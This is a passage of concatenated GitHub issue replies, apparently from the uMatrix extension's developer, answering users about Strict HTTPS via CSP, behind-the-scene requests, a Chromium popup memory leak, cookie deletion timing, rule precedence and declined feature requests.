both cases, whether Poper Blocker was enabled or not.~~\nNever mind, I looked more carefully. Indeed, what should have been blocked by the browser is not blocked when Poper Blocker makes the requests itself.\nGoing to have to look into this, kind of confused how come the requests for embedded resources end up being made by Poper Blocker.\n. Ok looking into this now. I have a hard-time figuring how come the jQuery lib of the extension Poper Blocker end up being the one pulling resources embedded in the page. Code is minified etc.\nAnyways, I am reconsidering the use of CSP to enforce Strict HTTPS. I will try to manually filter instead. Resources blocked due to not being properly https: can still show as allowed in the matrix, because they were blocked through something else than the matrix. I suppose longer term I will have to think of some visual feedback to inform users why some resources were blocked. The popup visual is getting kind of populated, not sure where I would fit this.\nAnd it just occurred to me that a good advantage of manually filtering non-https: requests is that this would work properly in synthetic docs, like http://chromium-behind-the-scene, which is not the case currently.\n. > expose myself to less secure JS as a result\nNo, the browser will block \"active\" mixed content: javascript is considered active mixed content. There will be an icon in the address bar, which can be used to allow if you wish. The benefit of Strict HTTPS is to be more hardcore than the browser, as it will also block passive mixed content (good for privacy).\nSee for yourself: https://www.bennish.net/mixed-content.html\n. > would Strict HTTPS on block both Active and Passive content, or just Passive?\nBoth. Anything which is not https:, wss:, or data: will be blocked.\n. Fixed in 0.9.0.0: uMatrix now blocks itself the non-secure requests, rather than relying on a CSP policy.\n. > does not seem to work [...] It only works if whitelisting the actual site you are on.\nIt's not a bug, it's how the feature works: See Per scope switches:\n\nallow a user to customize various settings for a specific scope\n. > wouldn't it be tidier and easier to have the possibility to specify multiple custom URL's to check for hosts files\n\nI must be misunderstanding something.. The text box is exactly for that purpose, to enter many URLs to custom hosts file locations.\n. Hosts files do not contain such thing as \"element blocking rule\". uMatrix does not support cosmetic filters, that job is for uBlock.\nIf anything else than a proper hosts file is fed to uMatrix, the result is undefined.\n. There is a \"Color-blind friendly\" checkbox in the Settings tab in the dashboard.\n. Can I have a screenshot of the console?\nIf the connection was blocked because of Strict HTTPS, then it won't show in the matrix, because uMatrix uses CSP to enforce HTTPS, and thus the attempted connection is blocked before it is passed to webRequest API.\n. Yes, that is Strict HTTPS in action.\nAnother way to block requests through unencrypted connection is to do it \"manually\" through webRequest API, which would allow these requests to be reported in the matrix, though the cell in which they would be reported would still be coloured as per matrix rules -- so it could happen a request blocked because Strict HTTPS would still be shown as allowed in the matrix if it was reported there.\n. A Content Security Policy header is injected to limit what kind of requests can be made and those requests are filtered/blocked by the browser, preventing the webRequest.onBeforeRequest() from being called at all for those requests.\nI didn't specify wss in that injected CSP header, looks like I should. The thing with websocket requests is that these are never passed to the webRequest API, as per API doc [1]. So I wasn't expecting to see them blocked, but then in retrospect it makes sense since CSP is not an API-specific thing.\n[1] \"only the following schemes are accessible: http://, https://, ftp://, file://, or chrome-extension://\"\n. > once you allow it in the CSP header, there won't be a way to block it through uMatrix\nIt will be blocked by the browser, without uMatrix having a way to know a request was even attempted. To me it looks like the browser discard the requests very early in its pipeline when blocked through CSP. As said I could change this to have uMatrix discards, but I really like the thoroughness of using CSP, not having to depend on a specific browser API (i.e a proxy could do the same, and all browsers with proper CSP support would behave all the same.)\n. > once you allow it in the CSP header\nRe-reading... Whatever is not blocked due to CSP will be seen by uMatrix (except for websocket requests as per API doc).\n. Do you have \"Predict network actions to improve page load performance\" enabled?\n. Ok, onTabUpdated is called, despite a whole new URL being loaded in the tab, not merely an update.\nA good fix is to further verify that the scope didn't change.\n. Yes, but that may take time. Next step I see for me is to bring in @Deathamns portability work from uBlock.\nBut really anybody is free to fork and port as they see fit though, so long as it is made clear that the fork is not under control of authors of the original project -- just like RequestPolicyContinued is not from the author(s) of RequestPolicy.\n. Actually to make things clearer, I want to do the port myself, using @Deathamns's work on uBlock as tutorial. I didn't know where to start before the FF port, now I have something to use as model. I want to do it myself as a way to learn FF framework.\n. Given the amount of users for Policeman (2,417), I don't feel too motivated into taking on this if it's going to be only useful to so few users, given the amount of work.\nThe reality is that this is a kind of tool which is appealing to very few users compared to RequestPolicy-like tools, which are themselves much less used than more generic blockers. And there is already such tool available for Firefox --  Policeman. So:\n- Lot of work\n- Very few users (also true for Chromium which never went beyond 20,000)\n- An alternative already exists -- Policeman\nFor now I feel my time would be better spent to make the code more portable -- using uBlock vAPI.\n. As said I am working on making the code portable by importing @Deathamns' API abstraction layer (the import was done in such manner as to preserve history of contributions).\nThis requires a lot of change on uMatrix's side, but once done, a Firefox version could just be a few lines of code away.\n. Fixed in 0.9.0.0.\n. That's what uBlock is for, finer-grained pattern-based requests.\nWhen uBlock issue #68 is addressed, that should become easier to quickly create a specific filter.\n. The longer the delay, the less useful the feature become.\n. > which one I should use to block stuff while keeping the performance impact minimum?\nuMatrix:\n- advanced users\n- likely to break stuff in default mode (need more attention at first, until all rules made)\n- can be turned into allow-all/block-exceptionally to minimize breakage\n- privacy/security control in your hands\nuBlock:\n- everybody\n- unlikely to break stuff in default mode\nPerformance-wise, I haven't run many benchmarks for uMatrix yet, but I am pretty sure the performance impact is lower with uMatrix:\n- doesn't scan/analyze/modify the DOM at the level uBlock does it (to find out which cosmetic filters need to be injected)\n- no scanning of a URL to find pattern, only the hostname portion of a URL used\n. > There should be a benchmark of uMatrix and uMatrix+uBlock\nUnlikely. Benchmarks are time-consuming, so there has to be a good reason to make one.\nThe benchmark I did for uMatrix is strictly to ensure that there is nothing wrong with the code, it's part of development, not an advertised feature.\nThe benchmarks I did for uBlock are to show how uBlock's improve on existing blockers such as ABP, AdBlock. uBlock's efficiency is an advertised feature.\nThere is nothing for uMatrix to compare against. People uses uMatrix for what it does, not because it's more efficient than something else unrelated.\nEdit: Anybody can run their own benchmarks, if someone wants one, it doesn't have to be me running it.\n. Due to bad backward-compatibility code: the old obsolete settings used to keep track of ua-spoofing and referrer-spoofing were not removed from the persistent storage, while I thought they were.\n. Kitchen sink syndrome.\nuMatrix's primary purpose is to block/allow requests. Chameleon's primary purpose is to detect fingerprinting-like activity.\n. Looks to me the dev console can do that job very well already, it shows the full URL of what is being blocked. What you are asking doesn't fit in the popup UI model, and I don't intend to change it.\n. Definitely not expected. I will look into this.\nA big difference with HTTPSB is that all the matrix data is now created in background page-side, and passed through messaging to the popup-side (because portability). That's a lot of data passed each time the matrix visually needs to be updated.\nAt first glance, there doesn't seem to be leaks, after a couple of click I see the memory go up, but I see it all returned after I wait long enough for the GC to kick in.\n- Are there any error messages in the extension's console?\n- Roughly, how many rules do you have?\n. Quickly running heap snapshots/timeline recording, quick look at results, it's as if the whole popup.html document is not flushed from memory when we close the popup UI.\nI am pretty sure I checked all that early versions of uMatrix, as getting rid of jQuery was one of the task I took upon in order to reduce memory footprint for the popup UI. I need to investigate further as to what is really happening.\n. Merely opening/closing the popup without any interaction leaks popup.html documents. That's bad. Something in there is holding onto the doc when the popup is closed (by all appearances).\nThis could also be caused by a new bug in the browser -- my understanding is that the browser is supposed to remove the whole document from memory when it is unloaded. I don't see why it lingers behind after being unloaded, as the popup UI is even more detached from the background page than before -- there is no longer a call to chrome.runtime.getBackgroundPage() from the popup code since a while now.\n. It's a pretty serious issue, this renders uMatrix rather unusable when going often to the popup UI. So far I see three listeners in effect which seems to cause the document to stay in memory. I have to find out what are these DOM listeners.\n. I just tested with an extension with a pretty minimal popup UI, and it does leak documents too. So that is not the listeners who leak the document, it's the opposite, and as far as I can tell it's a new Chromium bug.\nI've gone through recording Timeline events in the past to ensure no leak, so this is new to me that suddenly uMatrix would start to leak documents/nodes/listeners. I looked to the code and I just can't see anything in there which would explain a document leak.\nI will look through Chromium issues, maybe somebody else stumbled onto this already.\n. https://code.google.com/p/chromium/issues/detail?id=441500\n. This bug definitely needs more attention. It affects all extensions, specially those which require the user to interact often with the popup UI. That kind of memory leaks is detrimental to the whole browser, and to all extensions -- all of which, with this bug, are fair target for being called \"bloated\".\nI believe if the number of people who stars the issue go up a lot, the Chromium devs will be more willing to looking into it.\n. > This bug is non-existent on alt Chromium browsers Slimjet [Chromium version 40] and Opera 28 \nThe bug is present in Opera 28. It's a blink engine bug.\nWhy the easy-to-verify false statement?\n. I expect this to be fixed in 0.9.0.0.\n. I expect all these errors to be gone with 0.9.0.0, due to code refactoring.\n. Not \"forgotten\".\nIt just look I didn't get the CSS right. In retrospect I should not have used :after for RTL languages, as :before will be rendered to the right in RTL languages.\n. > Regarding local storage management, an API seems to be on its way.\nNice, I wasn't aware of that discussion. Looking at the proposal, I see:\n\nRestricts deletion to browsing data pertained to the given origin filter(s).\n\nSeems to be exactly what I needed from chrome API (I will keep thinking this through to be sure I am not missing anything with regard to uMatrix).\n. > I vote for the cookie being deleted with the Disallow-save\nCookie handling is an intensive task in uMatrix. The code has to be ready to have to handle maybe thousands of cookies (like say, first time uMatrix is installed), and every cookie has to be evaluated against the matrix, potentially for multiple, even unrelated scopes. So all the cookie deletion stuff is asynchronous, and done in a lazy way (there is a maximum of cookies to handle per cycle, the workload is spread over time).\nCurrently, for the scenario you describe, a \"cookie janitor\"  take care of that kind of \"forgotten\" cookies. The cookie janitor kicks in every 10 min. In my opinion this is an acceptable behavior for your scenario.\nEven the \"Delete blocked cookies\"  is not instantaneous, there is one to two minutes lag in order to handle all this in an asynchronous and CPU-polite manner (as long as the cookie header is blocked, there is no need to delete \"ASAP!\").\n. I gave a lot of thought to his, and the chosen solution is:\n- A per-scope switch to enable/disable cookie header stripping (globally enabled by default, just as it is now internally).\n- A new parameter setting added to the existing \"Delete blocked cookies\", to let the user provide how long after a blocked cookies has been seen the first time should it be deleted (default to ~zero, as it is internally now).\n. In some cases you do not want cookie headers to be stripped, right? (let's first narrowly focus on the issue to solve, not the solution).\n. What is the real life issue? Forget internal technical details. What is the real issue? Not being able to read a NY Times article after clicking a link because it can't see any cookie? (example of a real issue).\n. Ok, this is an XML document, so the script to spoof the UA should not be injected in anything else than HTML documents I guess. Not sure though... is there anything else than text/html and text/xhtml into which to spoofing code should be injected?\n. Should be fixed with changes in ed67045360f334f8a353d1ebf3e4253a943e5f76.\n. Anyways, it's not something that fits naturally in uMatrix, a firewall, not a URL processor. There is nothing wrong with an extension dedicated to that purpose.\n. Parsing/redirecting URLs is not something that fits uMatrix's purpose.\n. @d-kr Not sure but I think @softwarestake was just spamming. I removed the link he put in which was completely irrelevant.\n. Just blacklist/whitelist whatever domains in the global scope. This will cause these domains to be blacklisted/whitelisted everywhere.\nYou can do this manually using the \"My rules\" tab:\n* evil.com * block\nWill block all requests to evil.com from everywhere.\n. > I don't really get why those lists got ditched in uMatrix\nIn HTTPSB, these lists existed only to get around the inability to blacklist/whitelist in all scopes. Since now this can be accomplished using rules, that \"solution\" was no longer needed. I would never have included the feature in the first place in HTTPSB if it had been possible to apply rules in all scopes.\nReally I don't intend to bring them back, that would just be more clutter to solve something that can already be solved as is. I intend to be very conservative with uMatrix as I want the code base to grow sanely, something which I had lost control of with HTTPSB in a race to add more and more features.\nIn any case, leave the issue open, I have a history of sometimes changing my mind. Having issues simmering for a long time in the back of my mind, along with more feedback from other users help. At least what you want can be already accomplished.\n. * jquery.com * allow\nFrom the UI, you have to select global scope *, then allow (green) jquery.com domain, then persist rule by clicking on padlock.\n. - This also happens with uBlock/Chromium.\n- This DOES NOT happen with uBlock/Firefox.\n- This has nothing to do with the request being POST (there is one from github.com in there, properly blocked)\n- ~~That very specific https://www.google-analytics.com/collect request is NOT passed to the webRequest.onBeforeRequest API~~ Correction: it is.\n- There is another GET request in there to https://www.google-analytics.com/collect which is properly passed to the webRequest.onBeforeRequest API -- and hence properly blocked\n. Ok I see, I panicked a bit at first...\nFor whatever reasons, that specific request is sent from behind-the-scene. If you block behind-the-scene request like I do, it ends up being properly blocked.\n\nSomehow at first I couldn't see it being logged at the console, my mistake. One more reason why the behind-the-scene scope is so useful.\nUnfortunately uBlock doesn't process behind-the-scene requests, so for that kind of control, uMatrix must be used.\n. Because the request does not originate from any one tab. It does from our point of view since we know it happens when we refresh the page, but from uBlock's point of view the Chrome API says it does not know from which tab it came from. From Chrome API:\n\ntabId: \"The ID of the tab in which the request takes place. Set to -1 if the request isn't related to a tab.\"\n\nAnd for whatever reason, the tab id of that specific request is -1.\n. Many of these are no doubt related to #42.\nThe others related to runtime.lastError, it appears that browserAction.setBadgeTextand browserAction.setBadgeColor might have to be passed a callback after all, despite the doc stating there is no such thing. Actually, what version of browser are you using? Maybe these callbacks were added in a dev version of the browser, so not part of the official doc yet.\n. What browser is this?\n. Tab/page store binding refactored in 0.9.0.0, issue should be gone.\n. I don't see this as worth the amount of work and code complication.\n. > plugin was better before strict made became forced\nJust remove the blocking of frames in the global scope, save. This way, when you whitelist a domain, the frame will not be blocked. The frames will still be blocked only for graylisted (assuming you work in block-all by default) or blacklisted hostnames.\nThe real popup problem is not because of strict blocking, it's because the browser do not give access to the extension icon, this may cause issues whether frames are blocked or not. Another trick is to copy/paste the URL of the popup into a new tab in the browser, then configure the matrix for the popup.\n. > try loading: https://www.coursera.org/\nOne click: whitelisting dw0ugk4msqulk.cloudfront.net\n\ntry clicking the date dropdown on: http://finance.yahoo.com/q/op?s=QQQ+Options\n\nOne click: whitelisting yimg.com\nSave, then these will stay fixed. Backup your data once in a while so you can recover all your rules eventually. But as warned, if you can't stand managing a firewall, then it is not for you.\n. That's just the usual problem of the browser not waiting for the extensions to be fully ready before loading web pages. The only approximate remedy is to have extensions load as fast as possible. I addressed this in uBlock with various improvements, but I did not work that part much in uMatrix yet. One thing which may help, un-check \"Auto-update hosts files\" to be sure uMatrix load the cached copies of the file. Updating manually once in a while is fine, that's what I do myself. But eventually I will have to bring some of the same technics I used in uBlock to improve load speed, even though there is just no way to guarantee the extension will be ready before a tab load, that's by Chromium design.\n. Duplicate of #56.. Done, may take a while to be approved though, Opera code reviewers are on vacations.\n.  chrome-scheme is not what you are looking for, as it is for pages which URL starts with chrome:// -- chrome://settings/, chrome://extensions/ for examples.\nchromium-behind-the-scene is where you will find network requests which are made outside any tab. To access the chromium-behind-the-scene matrix, just go to uMatrix's dashboard, and bring up uMatrix pop-up while on any page in the dashboard:\n\nNote that not all behind-the-scene can be seen by uMatrix. For instance, any requests related to  browser/extension updates, and other such critical requests are not going through extensions. Also, network requests using websocket protocol are not seen by extensions (yet, chromium issue 129353).\n. > Looks like it's missing mail.google.com & googleusercontent.com. These connections are accessed via homepage extension(ANTP widgets - rss feed/meta tiles/gmail).\nYou will probably find them on the tab where they occurred: if a network request can be traced back to a specific tab, it will appear in the matrix for that tab. The chromium-behind-the-scene matrix is for those network which can't be tracked to a specific tab.\nEdit: Look at the first screenshot you sent, they are in there...\n\n. Ok look... Your first message there was no context whatsoever in how you got the requests in your lists. It is difficult to answer properly and in a time-saving manner.\nHere it is: all net requests are recorded in one matrix or another, except for those documented as not going through the webRequest API (webSockets, update-related, web store-related).\nNow you are disclosing a bit more information which should have been disclosed in the first report to save time: \"when I first launch Chrome\". That is issue #93, and even if I come around as improving this, it is really un-fixable as per browser design.\nBottom-line, I can't investigate for you remotely if you don't look first at every details before reporting to confirm there is really an issue. In your first report you did not look at the behind-the-scene matrix. In your second report, there is no mail.google.com.\nSo this: except for the known shortcomings of the webRequest API, please give me exact repro steps for whatever issue you have carefully confirmed on your side. So far I did see anything unexpected. I need repro steps, and before posting them, ensure it has nothing to do with the known shortcoming.\n. With the unified logger, users will no longer miss network requests, so long as they go through the web request API.\n. @AndreasBackx Can you port it?\n. Because I can't, no OSX, no Safari, but more importantly, no time.\n. 1. Probably hyperlink auditing\n2. No\n3. Behind-the-scene matrix\n. Default, or else it would break too many important things. The users must set it to block themselves.\n. https://github.com/gorhill/httpswitchboard/wiki/Behind-the-scene-requests\n. > not easily discoverable\nLet's not exaggerate:\n\n. Fixed in 0.9.0.0.\n. Thanks for catching this.\n. It's an XML document. In the console there is:\n\nRefused to load the script 'http://feeds.arstechnica.com/~d/styles/rss2full.xsl' because it violates the following Content Security\n\nSo it appears the browser considers XSL document to be \"script\", but refuses to even load these, which means uMatrix won't be aware that a script was requested. Since the document is an XML document, document.querySelectorAll('script'); return nothing. uMatrix can't know whether there are scripts for this page.\nThe XML document is parsed and converted to an HTML document by the XSL which the browser refuses to load.\nOnly solution I can see is to not apply any CSP is the Content-Type header does not match a HTML document.\n. Looks to me this now works fine in 0.9.0.0.\n. You can turn on/off selectively on a per-site basis: Per scope switches.\n. @CrisBRM I rather that he answers himself than wasting time speculating.\n. > My company's mail only works for FF ... I can help you work on?\nFrankly, it's such a specific and narrow case, it's starting to look like a job for a programmer for hire, and you have in mind I will code it voluntarily for you.\n. \nThis applies to this feature request, as well as some others which have been requested elsewhere.\nDevelopment is driven by features which are likely to be used by a wide number of users, not a rather specific feature useful in a very specific scenario for someone in particular.\n. > I'd love to have these options under one shop\nThe requested feature here makes sense for an add-on which specializes in spoofing UA. It does not fit at all in uMatrix, which primary purpose is the matrix as per UI and filtering engine.\n. You want a full detailed lists in each small matrix cell?\n. I will just save myself time and close this without further comment. Sometimes I am at lost for words and when it happens the project just become no fun anymore.\n. I thought I had updated it. I will download and see the differences with the current state of the project.\n. The stores manage auto-update, not the extensions.\n. Looks like a good idea to me, I like it.\n. @m-j-r No.\n. It works as expected.\nThe 1st-party cell is more generic than the facebook.com cell, so this means the facebook.com has to be evaluated first, then if and only if it doesn't have an own rule, uMatrix will find the closest ancestor (the Y axis), which will be the 1st-party cell (when on facebook.com).\nA rule which reads \"block facebook.com everywhere\" is more specific than a rule which says \"do not block 1st parties\", I don't see how the opposite can be argued.\nChanging the logic to comply with your expectation would lead to the terrible scenario of now having any blacklisted hostnames being free to load in your browser (as per 1st-party row) if you happen to visit one (mistakenly or not).\nThe current logic protects users against this happening. Yes, you will have to explicitly override the global blacklisting of facebook.com by toggling its state back to \"gray\" in the facebook.com scope: the rigorous precedence logic of the rules is more important than the inconvenience of having to graylist facebook.com after having blacklisted it globally -- something which needs to be done once.\n. HTML5 videos are not plug-ins. HTML5 media are reported into the other column, so this is where you have to block/allow them.\n. I am looking at it now, and it appears the video data is fetched through XHRs. So the rule youtube.com googlevideo.com xhr block prevented the video from playing.\n. > why\nI don't know, it's just how they implemented it in their html5player.js.\n. I am not equipped here to debug Chromium crashes. Please report to the Chromium devs: https://code.google.com/p/chromium/issues/list\nSubmit them a crash report, that will help them.\n. I do not intend the matrix to be more granular than it is now, that would be a feature which would be deemed useful to an ever smaller fraction of uMatrix users. uMatrix is already a fraction of users of uBlock.\nDup of #106.\n. I have to admit I don't understand the request. Could you attach a screenshot of the matrix for the result you want?\n. @p-b-- Why not use the header cells? That's why I didn't include a 3rd-party row (I considered it at design time), because the header cells can accomplish the same thing, without the need to clutter the matrix further.\n. I understood your pic @p-b-- , I decided to give more thought on this.\nThe workaround for that specific case is that instead of clicking once on the robertmuth.blogspot.com, you have to click thrice, i.e two more clicks. Now the issue is that you don't want to click two more times -- for when you actually want to give more permission to 1st-party domain.\nSo this is essentially this:\nTwo extra clicks\nvs.\nOne extra row, extra code path in the core of the filtering engine (not a big deal -- quick assessment), extra code in the popup UI (not fond to add even more complications in there though -- have a look at the code/CSS/HTML).\nAnd that difference is relevant only for when you actually decide to grant more permissions to the 1st-party domain.\n. I didn't decide against or for, I am just still assessing the overall benefit versus amount of work. If I come to see this as worth it I will look into this. I can see the elegance, the symmetry.\n. Well I can't prevent you from trying to add the feature but I know myself and to be honest in the current case I will find it hard to not do this myself as I want to keep complete grasp of how the code work. The real hard work is really in popup UI -- the filtering engine it is mostly a cut/paste (though I always run benchmarks as part of QA). There is always the possibility there is something I am not thinking which I would hit while coding this.\n. > I just want the 1st-party to be green here.\nThen why create an allow rule for all?\n. > Maybe because I want to allow all by default?\nYou are contradicting yourself:\n\nI just want the 1st-party to be green here.\n\nAlso, did you venture to set rules in narrower scopes?\n. I will decline, I do not see the point to throw in more code and code paths which only purpose would be to save two clicks in some use cases for some users.\nI do not accept pull requests other than trivial fix. This would turn me into a code reviewer, and this is not the hobby I picked with my presence on GitHub. And really, if ever I wanted to volunteer code review time, I would volunteer as a code reviewer for Firefox extensions.\n. Did you select \"Large\" for \"Text size\" in the Settings?\n. There is something peculiar with your browser settings. Even if I use large text for uMatrix, the popup is larger than yours:\n\nWhat are the settings for \"Web content\" in your browser settings? (font size, page zoom)\n. Thing is uMatrix (or any extension) does not control the popup size, the browser decides. Normally on a stock browser, I have designed the popup content to fit comfortably -- large text included -- into the the max width the browser will allow. So something in your setup (OS, browser) is causing the fonts to be larger than stock. Look at the tabs at the top: yours are rather small compared to what I get (I took care to resize my window close to what you have in the pics).\nBottom-line is that the browser has a max width in pixels for extension popup, and an extension has no say about this. You need to adjust whatever settings on your side which causes the problem, as making the matrix smaller is of course not an option (the header labels are already overflowing in your screenshot)\n. It's the browser picking the popup size, extensions have no say. The issue should be filed with Chromium, there is nothing I can do. The matrix was designed in such way that it fits in the largest allowed popup.\n. uMatrix can't control system/browser fonts, this is were the issue lies. In all cases I have seen, system fonts appear to be significantly smaller than the browser fonts, so there is some settings which only the users control which are changed from normal. It's for the user to fix.\n. Are you using the padlock when you make changes?\nAlso, there is a backup feature in the About tab, it's a good idea to use it regularly after you made many changes, so you can just restore all at once if something happen.\n. https://github.com/gorhill/httpswitchboard/wiki/The-matrix-toolbar#persist-temporary-rules\n. Setting text to large should not break the UI. Do you have other browser/system settings which affect font size?\n. What's the DPI as reported by your OS on that screen?\n. The only way I can get a matrix which doesn't fit in the limited space (the browser sets a maximum size for the popup) and which results in the padlock disappearing is when I set the default page zoom to 175% or higher. Is this your case?\n. Are we talking about the same zoom setting? I am talking about the one in the Settings page of the browser. This one definitely changes the zoom of the extension popups:\n\n. Dup of #73.\n. @requiredregistration \nI agree, but a specific issue should be opened for this.\n. > Should I close this?\nNo.\nI will not extend the UA-spoofing feature, but I will add the code to try to find the platform and use it, this seems trivial enough to me.\n. I imported code from uBlock for this part. There should be no connection to github at start time. Furthermore, if auto-update is not enabled, the only connection to github is supposed to occur when visiting the Hosts files page (to find out what needs to be updated). I will also revert this fix (because no longer relevant), so a user could ccompletely block uMatrix itself from fetching its own resources.\n. Fixed in 0.9.0.0.\n. > I hope you can recreate my problem and find a solution\nWhat problem?\nThe matrix reflects the network request traffic, I fail to see why that is a problem.\n. > The cpu usage increases averagely about 5 % with 1000 elements\nSorry but that makes no sense, for many reasons. Looks to me you are making assumptions of how uMatrix works internally, and using these assumptions to make more assumptions that the count is correlated to the CPU usage. Also \"5%\" is completely not significant measurement, I would like to know how you measured this. Let me see: eyeball the task manager?\nThe statistics for a specific URL won't be flushed from memory until some minutes after you leave that URL. The reason is that if you set temporary rules on some entries, you still want to see these entries after you refresh the page, as there are explicit rules onto them. It's per URL, not per site, so \"as long as I'm on Youtube\" is also wrong.\nI don't see any issue aside that the count is bothering you for some reasons.\n. I have to battle so many bad myths re. uBlock or uMatrix, that just for the record regarding\n\nthe cpu usage increases averagely about 5 % with 1000 elements\n\nI am currently at 1000 requests, and uMatrix's CPU is pretty much all the time at 0%.\nIt's completely un-substantiated to say that uMatrix adds 5% CPU usage after it blocks a lot. Not only un-substantiated, but if you understood how it works internally, it makes no sense at all.\nThe only thing uMatrix currently crippling severely uMatrix is that horrible Chromium memory leak, which by the look of it will take forever to have fixed -- still this doesn't make uMatrix suddenly CPU hungry.\n. > whether you know why youtube loads constantly new elements\nIf you try the network request logger in uBlock (better than the one in uMatrix -- plan to bring it to uMatrix eventually), you can see what are all these requests in real-time. Actually, thinking of it, what is your settings for number of request log entry in uMatrix?\nuMatrix is actually more efficient than HTTPSB in processing network requests -- that part of the code was improved and significantly simplified. Regarding the content scripts injected on the page, it's virtually a no-op relative to uBlock, i.e. there is pretty much nothing happening on a Youtube video page.\nWhen you say your CPU usage is high, what is it actually? Does it bounce a lot widely? Do you have hardware acceleration enabled? Did you try forcing Flash to see if there is a difference? What browser version? Did you try rebooting the browser (sometimes things can become weird, it has happened to me)? Best is probably to post about your observations on Chromium forum somewhere along with all the pertinent details.\n. No there is no way to do it from the matrix. Allowing this would mean to lists all possible TLDs and this would mess up a lot the matrix with noise. Entering manually is the workaround, I don't intend to change this, I want to keep the matrix clean for the majority of users. Instead of whitelisting d1506sp6x4e9z7.cloudfront.net, why not just go directly to the rules editor and enter right away site.com cloudfront.net, so can skip having to find it.\nAlso, why not just whitelist whatever [...].cloudfront.net hostname from the matrix? There can't be that many of them for a single site. Blanket whitelisting everything from cloudfront.net doesn't look like a good idea to me (another reason to not encourage it from the matrix).\n. > I can try to make a PR with the proposed changes if you are interested\nI don't want anything below an effective domain to appear in the matrix. This has been designed this way since the very early versions of HTTPSB. By design.\nIt's an exceptional case to want to assign a rule to something below an effective domain, and especially it is not something which is advised to do. And I just don't want this kind of exceptional case to make it into the matrix, over-complicating the matrix UI code which is already rather complex.\n. > whitelist CDNs that use multiple subdomains\nd1506sp6x4e9z7.cloudfront.net is not a subdomain, it is an effective domain (albeit private), as per Mozilla Public Suffix list. The best practice is to whitelist each separately as needed. Asking to whitelist cloudfront.net is like asking to whitelist co.uk: not advised. You can do it manually in uMatrix, but the matrix UI will not encourage you to do what is not advised.\n. The easiest way for me to implement this is to allow:\n123.45.67\n123.45\n123\nIn rules, i.e. no need for a formal CIDR declaration.\n. > I didn't realize my adguard was changing the REFERER of sites anyhow\nuMatrix is documented to modify referrer header if the feature is active. Please bring that issue with AdGuard devs if their extension is doing something unexpected. I can't possibly be asked to investigate someone else's undocumented software feature.\nIn any case, it's a Chromium API limitation: only one extension can modify a header entry.\n. I can't reproduce. Are you using an extension-based VPN provider?\n. Sorry, I am not ready to accept pull requests for that project. Doing so I fear the code would grow out of control from my point of view. I tend to think a lot before implementing something, and accepting pull requests goes counter to this.\nNot sure about the \"extremely\" in \"extremely useful\". Already at a glance one knows there is an allow rule for googlevideo.com while in www.youtube.com scope. The only kink is that the rule could belong to a broader scope, but I don't see this as so terrible.\nProbably what I would personally prefer is to be able to use arrow keys to quickly move between scopes, but not to further clutter the UI.\n. Setting rules works fine on Firefox for Android.\nClosing, issue is old and probably obsolete given it works on Firefox for Android.. The browser sends these net requests.\n. I can't find the doc I read a long time ago, but here is what is happening, as per what I remember from Chromium doc. What you type in the omnibar could be a search term, or the name of a server to which to connect. If the expression is a single word, Chromium will try to use it as a hostname in a network request. This will fail as the DNS fails to lookup the term, in which case Chromium will then treat the term as a search query.\nSo a net request was fired by Chromium (because single word), and uBlock intercepted that net request and report it, as it is designed to do.\nMore of a browser behavior than a browser bug really.\n. Related: https://github.com/gorhill/httpswitchboard/issues/214\n. Yes, I wrote a TODO note in the source that I should do this.\nI am pretty certain I read a long time ago when I started to use CSP that the doc said something like, \"if multiple CSP headers exist, the most restrictive directives win\". No longer sure if I read this right or whetehr they change the spec meanwhile. In any case, this definitely need to be solved, as more and more site will start to use CSP headers I suppose.\n. Excellent test case: github.com, it makes use of CSP header:\ndefault-src *; script-src assets-cdn.github.com collector-cdn.github.com; object-src assets-cdn.github.com; style-src 'self' 'unsafe-inline' 'unsafe-eval' assets-cdn.github.com; img-src 'self' data: assets-cdn.github.com identicons.github.com www.google-analytics.com collector.githubapp.com *.githubusercontent.com *.gravatar.com *.wp.com; media-src 'none'; frame-src 'self' render.githubusercontent.com gist.github.com www.youtube.com player.vimeo.com checkout.paypal.com; font-src assets-cdn.github.com; connect-src 'self' live.github.com wss://live.github.com uploads.github.com status.github.com api.github.com www.google-analytics.com github-cloud.s3.amazonaws.com\n. The matrix is supposed to open with the scope selected to the last scope you used. If the last scope was was hostname-level, it is supposed to open at hostname-level. If last to scope was domain-level, it is supposed to open at domain-level.\nEdit: I just tried, and this works as expected.\n. Yes, across browser sessions. However, keep in mind that even if you are using hostname-level, bringing up the matrix on Github (for example) will select the domain-level (visually), because the hostname happens to match the domain name (github.com = github.com). However, the level will still be hostname-level, so visiting http://www.example.com will set the matrix to www.example.com, not example.com.\nSo it comes down to: what was the hostname of the page you visited when you thought uMatrix lost your setting?\n. Dup of #73.\n. Duplicate of #30.\n. I can't help you. uMatrix shows you what is blocked or not blocked. You are the best placed to know what network traffic should be blocked or not as per matrix. Also, check the switch \"Strict HTTPS\", you may need to turn it off.\n. @ThePierrezou \nI don't agree that all-in-one is a virtue in itself. I won't go down that path with uMatrix because I don't think it's a good idea, and anyways I moved away from this (HTTPSB) with uMatrix.\nOn the other hand, there are other open source projects out there where you could file that feature request: you could ask Adblock Edge to expand itself into an all-in-one by adopting uMatrix UI, or ask Policeman for Firefox to support \"adblock filtering\". It doesn't have to be me only.\n. Duplicate of #46.\n. Malware domains\u200e doesn't update from its home server anymore, the owner of the server had to block requests to download http://mirror1.malwaredomains.com/files/justdomains, because of bandwidth cost.\nuMatrix now hosts that file, and it will download if and only if there is a new version available.\nAt step 3), I got 19,397, not 11,416. No matter how much I try, I can't get that \"11,416\" count.\n. > I have version 0.8.1.3, latest in Chrome Store\nOk I understand. The latest filter-lists.json no longer uses malwaredomains.com server to fetch the list. However the change is after 0.8.1.3.\n. I updated all 3rd-party assets, that should resolve the inconsistency.\n. Ok, let's see if this causes problem in the future.\n. uMatrix rules do not have the same semantic as HTTPSB rules, so HTTPSB's rules cannot be imported in uMatrix, while retaining their meanings. The difference is that in HTTPSB, the source part of a rule is not \"seen\" by lower scopes, while it is the case in uMatrix. As a result, in uMatrix there is only one ruleset, while there as many as there are scopes in HTTPSB.\n. That file is over 30 MB, no way I will ever add this to the package. If you are on Chromium, setup a local server to host it, if you are on Firefox, save the file locally and then you can add it as a file:/// URL.\n. It's for users to update, there is so much one person can do on his own free time (which essentially does not exist anymore). See it a your contribution to yourself.\n. Give me a URL which I can just click please.\n. The server return 400 OK when that image is requested.\nThe site does not like referrer spoofing, just disable referring spoofing for that site.\n. Sorry but this makes no sense. I think you are assuming how uMatrix work, and drawing conclusions from these (erroneous I suspect) assumptions.\nThe counter updates lazily, only when network requests have not been seen for a set time.\nSomething else is slowing down your Gmail, and it can't possibly be 